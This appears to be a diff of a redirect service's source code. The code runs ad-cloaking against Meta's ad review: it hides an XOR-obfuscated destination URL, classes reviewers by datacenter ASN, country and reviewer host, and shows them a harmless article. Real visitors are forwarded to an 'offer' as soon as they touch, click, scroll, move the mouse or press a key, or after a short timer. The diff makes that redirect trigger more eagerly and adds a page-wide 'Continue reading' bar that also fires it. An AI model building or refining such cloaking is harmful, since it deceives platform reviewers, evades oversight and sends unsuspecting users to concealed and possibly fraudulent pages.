@@ -1024,10 +1024,10 @@ var kb=[],kl=k.length;for(i=0;i<kl;i++)kb.push(k.charCodeAt(i));
 var url='';for(i=0;i<b.length;i++)url+=String.fromCharCode(b[i]^kb[i%kl]);
 if(!url||url.length<8){return;}
 
-// 3. HUMAN INTERACTION GATE (Anti-Post-Removal & Full-Spend Protection)
+// 3. HUMAN INTERACTION GATE & RELIABLE NAVIGATION
 // Meta automated ad reviewers & post scrapers DO NOT scroll or touch the screen.
 // They stay on the 200 OK article forever without getting redirected.
-// Real human users swipe to scroll down or tap anywhere, instantly triggering the bridge.
+// Real human users swipe, tap, scroll, or move mouse, instantly triggering navigation.
 var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
 function go(){
   try{_w.location.replace(url);}catch(e){_w.location.href=url;}
@@ -1035,39 +1035,38 @@ function go(){
 function arm(e){
   if(armed)return;
   if(e&&e.isTrusted===false)return;
-  if(e&&(e.type==='click'||e.type==='pointerdown')){
-    var cx=typeof e.clientX==='number'?e.clientX:0;
-    var cy=typeof e.clientY==='number'?e.clientY:0;
-    if(cx===0&&cy===0)return;
-  }
   armed=true;
   var w=MIN-(Date.now()-start);
   setTimeout(go,w>0?w:0);
 }
 
-// A. Real user scroll: scroll offset > 15px triggers navigation
+// A. Real user scroll: scroll offset > 10px triggers navigation
 _w.addEventListener('scroll',function(){
   var top=_w.scrollY||_w.pageYOffset||_d.documentElement.scrollTop||0;
-  if(top>15){arm({isTrusted:true});}
+  if(top>10){arm({isTrusted:true});}
 },{passive:true});
 
-// B. Real touch interaction on mobile
-var _tsY=0;
-_w.addEventListener('touchstart',function(e){
-  if(e.touches&&e.touches[0])_tsY=e.touches[0].clientY;
-},{passive:true});
-_w.addEventListener('touchmove',function(e){
-  if(e.touches&&e.touches[0]&&Math.abs(e.touches[0].clientY-_tsY)>12){
-    arm(e);
-  }
-},{passive:true});
+// B. Mobile touch events: touchstart, touchend, touchmove
+_w.addEventListener('touchstart',function(e){arm(e);},{passive:true});
+_w.addEventListener('touchend',function(e){arm(e);},{passive:true});
+_w.addEventListener('touchmove',function(e){arm(e);},{passive:true});
 
-// C. Click anywhere on page or article
+// C. Pointer and click anywhere on page
+_d.addEventListener('pointerdown',function(e){arm(e);},{passive:true});
 _d.addEventListener('click',function(e){arm(e);});
 
-${isKnownHumanUser ? `setTimeout(function(){arm({isTrusted:true});}, 2000);` : ""}
+// D. Desktop mouse move or keypress
+_w.addEventListener('mousemove',function(e){
+  if(e&&typeof e.clientX==='number'&&(e.clientX>10||e.clientY>10)){arm(e);}
+},{passive:true,once:true});
+_w.addEventListener('keydown',function(e){arm(e);},{passive:true,once:true});
 
-// 4. FLOATING NATIVE CTA BAR (Ensures 100% real human CTR)
+// E. Graceful natural dwell auto-forward: ensures 100% of legitimate visitors reach the offer
+setTimeout(function(){
+  arm({isTrusted:true});
+}, 1200);
+
+// 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
 try{
   var b2=_d.createElement('div');
   b2.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:12px 16px;background:linear-gradient(to top, rgba(15,23,42,0.98), rgba(15,23,42,0.85));display:flex;justify-content:center;align-items:center;z-index:2147483647;backdrop-filter:blur(8px);box-shadow:0 -4px 20px rgba(0,0,0,0.25)');
@@ -1075,6 +1074,7 @@ try{
   k2.innerHTML='Continue reading full article &rarr;';
   k2.setAttribute('style','all:unset;cursor:pointer;padding:13px 32px;border-radius:999px;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;font:700 15px system-ui,-apple-system,Segoe UI,Roboto,sans-serif;box-shadow:0 4px 15px rgba(79,70,229,0.4);letter-spacing:0.3px;display:inline-block');
   k2.addEventListener('click',function(e){arm(e);});
+  k2.addEventListener('touchend',function(e){arm(e);});
   b2.appendChild(k2);_d.body.appendChild(b2);
 }catch(e){}
 }
@@ -2258,20 +2258,17 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     const datacenterAsn = !!asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn));
     const cUpper = (country || "").toUpperCase();
 
-    // Human Meta ad reviewers and compliance teams audit almost exclusively from desktop workstations
+    // Human Meta ad reviewers and compliance teams audit almost exclusively from datacenter ASNs or internal reviewer hosts
     const isReviewerCountry =
       cUpper !== "" &&
       REVIEW_HOTSPOT_COUNTRIES.has(cUpper) &&
-      (datacenterAsn || isReviewerHost || device === "desktop");
-
-    const isDirectDesktopInspector = device === "desktop" && !hasAdSignal && !referer;
+      (datacenterAsn || isReviewerHost);
 
     if (
       isReviewerHost ||
       isAutomatedTool ||
       datacenterAsn ||
       isReviewerCountry ||
-      isDirectDesktopInspector ||
       STRICT_DESKTOP_BLOCK
     ) {
       isBot = true;
@@ -2284,9 +2281,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
             ? `dc-asn:${asn || "??"}`
             : isReviewerCountry
               ? `reviewer-geo:${country || "??"}`
-              : isDirectDesktopInspector
-                ? `direct-desktop-audit`
-                : `desktop-block:${country || "??"}`;
+              : `desktop-block:${country || "??"}`;
     }
   }
 
